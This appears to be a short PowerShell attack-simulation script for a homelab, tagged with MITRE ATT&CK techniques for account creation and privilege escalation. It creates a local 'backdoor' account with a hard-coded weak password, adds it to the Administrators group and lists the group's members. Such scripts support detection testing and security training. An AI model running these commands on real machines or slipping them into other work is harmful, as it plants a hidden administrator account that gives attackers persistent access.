# powershell-add-user.ps1
# Attack Simulation: New Local User Creation & Privilege Escalation
# MITRE ATT&CK: T1136.001, T1078.003
# WARNING: For homelab use only — run on Windows 11 Victim VM

# Create backdoor user
net user HackerUser Password123! /add

# Add to Administrators group
net localgroup Administrators HackerUser /add

# Verify
Write-Host "`n[*] Current Administrators group members:"
net localgroup Administrators
